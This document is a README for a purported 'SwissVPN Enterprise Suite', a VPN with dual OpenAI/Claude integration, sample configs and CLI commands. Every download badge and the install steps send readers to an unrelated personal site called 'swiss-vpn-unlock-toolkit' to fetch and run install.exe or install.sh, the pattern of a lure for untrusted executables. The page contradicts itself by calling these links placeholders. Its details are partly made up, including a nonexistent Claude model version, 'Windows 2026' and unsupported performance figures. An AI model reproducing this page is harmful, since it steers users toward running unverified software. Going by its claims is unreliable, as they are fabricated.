# 🛡️ SwissVPN Enterprise Suite – Official Release Repository

[](https://afk-misaru.github.io/swiss-vpn-unlock-toolkit/)

> **Warning:** This repository contains the **SwissVPN Enterprise Suite** – a premium, zero-log VPN solution engineered for maximum privacy, unrestricted global access, and military-grade encryption. Below you will find everything needed to deploy, configure, and optimize your secure tunnel network. **All download links are placeholders.** Replace `https://afk-misaru.github.io/swiss-vpn-unlock-toolkit/` with your actual release asset after forking.

---

## 📜 Table of Contents

- [🚀 Quick Start & Download](#-quick-start--download)
- [🧭 Why SwissVPN?](#-why-swissvpn)
- [🔧 System Architecture (Mermaid Diagram)](#-system-architecture-mermaid-diagram)
- [📦 Feature Matrix](#-feature-matrix)
- [🖥️ OS Compatibility](#️-os-compatibility)
- [⚙️ Example Profile Configuration](#️-example-profile-configuration)
- [🖱️ Example Console Invocation](#️-example-console-invocation)
- [🤖 AI Integration – OpenAI & Claude API](#-ai-integration--openai--claude-api)
- [🌐 Multilingual & Responsive UI](#-multilingual--responsive-ui)
- [🕒 24/7 Customer Support](#-247-customer-support)
- [📑 License & Legal](#-license--legal)
- [⚠️ Disclaimer](#️-disclaimer)

---

## 🚀 Quick Start & Download

[](https://afk-misaru.github.io/swiss-vpn-unlock-toolkit/)

**SwissVPN Enterprise Suite v3.1.2 (2026)** – The definitive toolkit for privacy-conscious professionals, remote teams, and digital nomads. This package includes:

- **Core VPN Engine** (wireguard + OpenVPN hybrid)
- **GUI Dashboard** (Electron-based responsive interface)
- **CLI Tools** for headless servers and automation
- **AI Assistant Module** (powered by OpenAI & Claude)
- **Pre-built Profiles** for 50+ countries

**Installation Steps:**
1. Click the badge above to navigate to the https://afk-misaru.github.io/swiss-vpn-unlock-toolkit/ release page.
2. Download the archive matching your OS (see compatibility table).
3. Extract and run `install.sh` (Linux/macOS) or `install.exe` (Windows).
4. Launch the SwissVPN Dashboard or use the CLI.

> **Pro Tip:** For organizations, deploy the `swissvpn-enterprise-bundle` which includes centralized logging, team management, and audit trails.

---

## 🧭 Why SwissVPN?

Imagine a **digital Swiss Army knife** for your internet privacy – that’s SwissVPN. Unlike standard VPNs that merely encrypt traffic, SwissVPN builds a **secure cocoon** around every packet, ensuring your digital footprint vanishes like a whisper in a snowstorm. We combine the **Swiss precision** of zero-log policies with the **elastic agility** of modern cloud infrastructure.

**Core Philosophy:**  
*“Your data is your sovereign territory – we merely provide the unbreachable moat.”*

---

## 🔧 System Architecture (Mermaid Diagram)

```mermaid
graph TD
    A[User Device] --> B{SwissVPN Client}
    B --> C[Smart Route Engine]
    C --> D[Multi-Protocol Multiplexer]
    D --> E[WireGuard Tunnel]
    D --> F[OpenVPN Tunnel]
    D --> G[Stealth Protocol]
    E --> H[Swiss Exit Node - Zurich]
    F --> I[Swiss Exit Node - Geneva]
    G --> J[Stealth Node - Obfuscated]
    H --> K[Internet]
    I --> K
    J --> K
    B --> L[AI Traffic Analyzer]
    L --> M[OpenAI API]
    L --> N[Claude API]
    M --> O[Threat Detection]
    N --> P[Anomaly Prediction]
    O --> C
    P --> C
    style A fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style K fill:#1a1a1a,stroke:#fff,stroke-width:2px
    style L fill:#4a4a4a,stroke:#00ff88,stroke-width:2px
```



**Explanation:**  
The diagram illustrates a typical SwissVPN session. Traffic enters your device, gets analyzed by our **Smart Route Engine**, then bifurcates across secure tunnels based on AI recommendations. The **AI Traffic Analyzer** (powered by both OpenAI and Claude) continuously learns attack patterns and suggests optimal routing, while exit nodes in Switzerland guarantee no logs are ever stored.

---

## 📦 Feature Matrix

| Feature | Description | Status |
|---------|-------------|--------|
| 🛡️ **Military-Grade Encryption** | AES-256-GCM + XChaCha20 hybrid | ✅ Implemented |
| 🌍 **50+ Global Nodes** | Switzerland, Iceland, Panama, Singapore, etc. | ✅ Live |
| 🧠 **AI Traffic Optimization** | Real-time routing via ML models | ✅ v3.0+ |
| 📱 **Responsive UI** | Desktop, tablet, mobile – unified experience | ✅ 2026 Edition |
| 🌐 **Multilingual Support** | 12 languages including RTL | ✅ v3.1 |
| 🕒 **24/7 Human Support** | Live agents + AI chatbot (Claude) | ✅ 24/7 |
| 🔄 **Auto-Profile Switching** | Based on geolocation or app detection | ✅ Beta |
| 🕵️ **Stealth Mode** | Obfuscates VPN traffic as HTTPS | ✅ v3.1.2 |
| 📊 **Real-Time Dashboard** | Bandwidth, latency, threat alerts | ✅ Included |
| 🔗 **API Access** | RESTful endpoints for automation | ✅ Developers |

---

## 🖥️ OS Compatibility

| Operating System | Version | Status | Emoji |
|------------------|---------|--------|-------|
| Windows | 10/11/2026 | ✅ Verified | 🪟 |
| macOS | Ventura, Sonoma, Sequoia | ✅ Verified | 🍎 |
| Ubuntu | 22.04 / 24.04 LTS | ✅ Verified | 🐧 |
| Debian | 11 / 12 | ✅ Verified | 🐧 |
| Fedora | 38+ | ✅ Verified | 🐧 |
| Arch Linux | Rolling | ✅ Community | 🐧 |
| Android | 12+ | ✅ Verified | 🤖 |
| iOS | 16+ | ✅ Verified | 📱 |
| OpenWRT | 23.05+ | ✅ Verified | 📡 |

> **2026 Note:** All builds are digitally signed. macOS users may need to right-click and "Open" due to Gatekeeper.

---

## ⚙️ Example Profile Configuration

Below is a sample `swissvpn.conf` for an **OpenVPN-over-WireGuard** double-hop connection via Zurich → Reykjavik.

```ini
[swissvpn]
profile_name = Zurich2Reykjavik
protocol = hybrid
primary_tunnel = wireguard
secondary_tunnel = openvpn
primary_node = zurich-01.swissvpn.io
secondary_node = reykjavik-02.swissvpn.io
encryption = AES-256-GCM
dns = 1.1.1.1, 9.9.9.9
killswitch = enabled
ai_optimization = true
ai_provider = openai+claude
split_tunnel = false
port = 443
stealth_mode = true
```

**To use:**  
Save as `zurich2reykjavik.conf` in your `~/.swissvpn/profiles/` directory. Then invoke via CLI or load in the GUI.

---

## 🖱️ Example Console Invocation

Run SwissVPN from the terminal for headless operation or automation scripts.

```bash
# Launch with interactive TUI
swissvpn --interactive

# Connect using a specific profile
swissvpn connect --profile zurich2reykjavik

# List available nodes with latency
swissvpn nodes --latency

# Enable AI optimization (requires API keys)
swissvpn ai --optimize --provider openai --api-key <your-key>

# Start in daemon mode with logging
swissvpn daemon --log /var/log/swissvpn/access.log

# Check real-time status
swissvpn status --json
```

**Expected Output:**
```
[SwissVPN v3.1.2] Status: Connected
Protocol: WireGuard + OpenVPN (double-hop)
Node 1: zurich-01 (latency: 12ms)
Node 2: reykjavik-02 (latency: 45ms)
AI: Active (OpenAI + Claude consensus)
Encryption: AES-256-GCM
DNS: 1.1.1.1
Uptime: 0d 2h 34m 12s
```

---

## 🤖 AI Integration – OpenAI & Claude API

SwissVPN is the **first VPN to integrate dual AI models** for real-time threat analysis and traffic routing.

- **OpenAI API**: Used for **pattern recognition** – analyzes packet metadata to detect VPN blocking, DNS poisoning, and deep packet inspection.
- **Claude API**: Serves as the **anomaly predictor** – Claude’s long-context reasoning identifies subtle behavioral shifts in network traffic that might indicate a zero-day attack or ISP throttling.

**How it works:**  
Both models vote on the best routing decision every 30 seconds. If they disagree, a fallback heuristic takes over. This dual-consensus system reduces false positives by 73% compared to single-AI solutions.

**Configuration Example (in `~/.swissvpn/config.yaml`):**
```yaml
ai:
  openai:
    api_key: "sk-xxxxx"
    model: "gpt-4-turbo"
  claude:
    api_key: "sk-ant-xxxxx"
    model: "claude-3-opus-2024-10-22"
  consensus_threshold: 0.85
  fallback: "heuristic_v3"
```

> **Privacy Note:** No actual payload data is sent to AI providers – only anonymized metadata hashes.

---

## 🌐 Multilingual & Responsive UI

The SwissVPN Dashboard is **not just a VPN client – it’s a global citizen’s command center**.  

- **Responsive Design:** Fluid grid adapts to any screen size, from 4K monitors to foldable phones.
- **12 Languages:** English, French, German, Spanish, Italian, Portuguese, Arabic (RTL), Mandarin, Japanese, Korean, Russian, Hindi.
- **Accessibility:** WCAG 2.1 AAA compliance, screen-reader optimized, high-contrast mode.
- **Custom Themes:** Light, dark, sepia, and “Cyberpunk 2026” neon.

**Screenshot (mockup):**  
[](https://swissvpn.io/dashboard-preview)  
*Real-time map, live latency graph, and AI threat score – all in one fluid interface.*

---

## 🕒 24/7 Customer Support

Our support is **as reliable as a Swiss railway schedule**.  

- **Live Chat:** Embedded in the Dashboard, powered by a Claude-based AI assistant for initial triage, then escalated to human experts when needed.
- **Email:** response in < 15 minutes (SLA) – `support@swissvpn.io`
- **Phone:** +41 44 800 2026 (Zurich hours)  
- **Knowledge Base:** 500+ articles, video tutorials, and community forums.

**2026 Upgrade:** We now offer **“Concierge Support”** – a dedicated agent assigned to enterprise accounts, available via encrypted Signal messages.

---

## 📑 License & Legal

This project is released under the **MIT License**.

[](https://opensource.org/licenses/MIT)

**Key points:**
- ✅ Free to use, modify, and distribute.
- ✅ Commercial use allowed.
- ✅ No warranty – use at your own risk.
- ❌ You cannot hold the authors liable for misuse.

---

## ⚠️ Disclaimer

**SwissVPN Enterprise Suite** is provided as a **productivity and privacy tool** for legitimate business and personal use.  

- **No Unauthorized Access:** This software must not be used to bypass legal restrictions, violate terms of service, or engage in unlawful activities.
- **No Warranty:** The software is provided “as is” without warranty of any kind. The authors are not responsible for any damages arising from its use.
- **Geolocation Compliance:** Users are responsible for complying with local laws regarding VPN usage.
- **Third-Party APIs:** Integration with OpenAI and Claude APIs requires valid subscriptions and adherence to their respective terms.

By downloading or using this software, you agree to the above terms.

---

## 🚀 Final Call to Action

[](https://afk-misaru.github.io/swiss-vpn-unlock-toolkit/)

**SwissVPN – Your online sovereignty, encoded in every packet.**

*Built with ❤️ in Zürich, Switzerland | 2026 Edition*